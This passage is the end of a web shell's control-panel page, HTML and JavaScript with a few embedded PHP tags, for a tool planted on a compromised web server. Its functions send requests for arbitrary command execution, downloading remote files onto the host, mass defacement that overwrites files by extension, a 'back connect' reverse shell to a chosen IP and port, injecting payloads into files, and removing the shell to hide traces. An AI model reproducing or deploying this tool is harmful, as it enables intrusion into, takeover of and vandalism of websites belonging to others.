                            <button class="btn btn-success" onclick="saveFile('${path}')">
                                <i class="fas fa-save"></i> Save
                            </button>
                            <button class="btn btn-warning" onclick="loadFiles()">
                                <i class="fas fa-times"></i> Cancel
                            </button>
                        </div>
                    </div>
                `;
                
                document.getElementById('files-container').innerHTML = editor;
            }
        });
    }

    async function saveFile(path) {
        const content = document.getElementById('editor-content').value;
        const result = await ajaxRequest('edit_file', { 
            file: path, 
            content: content 
        });
        
        if (result.success) {
            showAlert('success', result.message);
            loadFiles();
        }
    }

    // Other features
    async function downloadFromUrl() {
        const url = document.getElementById('file-url').value;
        const filename = document.getElementById('custom-name').value || basename(url);
        
        if (!url) {
            showAlert('warning', 'Please enter URL');
            return;
        }
        
        const result = await ajaxRequest('download_url', { 
            url: url, 
            filename: filename 
        });
        
        if (result.success) {
            showAlert('success', result.message);
            loadFiles();
        }
    }

    async function massDeface() {
        const extensions = document.getElementById('extensions').value;
        const message = document.getElementById('deface-message').value;
        
        if (!confirm('This will overwrite all files with selected extensions. Continue?')) {
            return;
        }
        
        const result = await ajaxRequest('mass_deface', { 
            extensions: extensions, 
            message: message 
        });
        
        showAlert(result.success ? 'success' : 'error', result.message);
    }

    async function executeCommand() {
        const cmd = document.getElementById('command').value;
        if (!cmd) return;
        
        const result = await ajaxRequest('execute', { cmd: cmd });
        
        if (result.success) {
            document.getElementById('console-output').textContent = result.data;
        }
    }

    function setCommand(cmd) {
        document.getElementById('command').value = cmd;
    }

    async function backConnect() {
        const ip = document.getElementById('connect-ip').value;
        const port = document.getElementById('connect-port').value;
        
        if (!ip || !port) {
            showAlert('warning', 'Please enter IP and port');
            return;
        }
        
        const result = await ajaxRequest('back_connect', { 
            ip: ip, 
            port: port 
        });
        
        showAlert(result.success ? 'success' : 'error', result.message);
    }

    async function injectWaf() {
        const file = document.getElementById('waf-file').value;
        const payload = document.getElementById('waf-payload').value;
        const method = document.getElementById('waf-method').value;
        
        if (!file || !payload) {
            showAlert('warning', 'Please enter file and payload');
            return;
        }
        
        const result = await ajaxRequest('waf_inject', { 
            file: file, 
            payload: payload, 
            method: method 
        });
        
        showAlert(result.success ? 'success' : 'error', result.message);
    }

    function selfRemove() {
        if (confirm('Are you sure? This will delete the shell permanently!')) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.innerHTML = '<input type="hidden" name="self_remove" value="1">';
            document.body.appendChild(form);
            form.submit();
        }
    }

    // Utility functions
    function showAlert(type, message) {
        const container = document.getElementById('alert-container');
        const alert = document.createElement('div');
        alert.className = `alert alert-${type}`;
        alert.innerHTML = `
            <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'times-circle' : 'info-circle'}"></i>
            ${message}
        `;
        container.appendChild(alert);
        
        setTimeout(() => {
            alert.remove();
        }, 5000);
    }

    function updatePasteButton() {
        const btn = document.getElementById('paste-btn');
        btn.disabled = !clipboard || clipboard.length === 0;
    }

    function updateClipboard() {
        // Update from session (simplified)
        if (clipboard.length === 0 && <?= !empty($_SESSION['clipboard']) ? 'true' : 'false' ?>) {
            clipboard = <?= json_encode($_SESSION['clipboard'] ?? []) ?>;
            copyMode = '<?= $_SESSION['copy_mode'] ?? 'copy' ?>';
            updatePasteButton();
        }
    }

    function toggleTaskbar() {
        document.getElementById('taskbar').classList.toggle('active');
    }

    // Helper
    function basename(path) {
        return path.split('/').pop().split('?')[0];
    }
    </script>
</body>
</html>
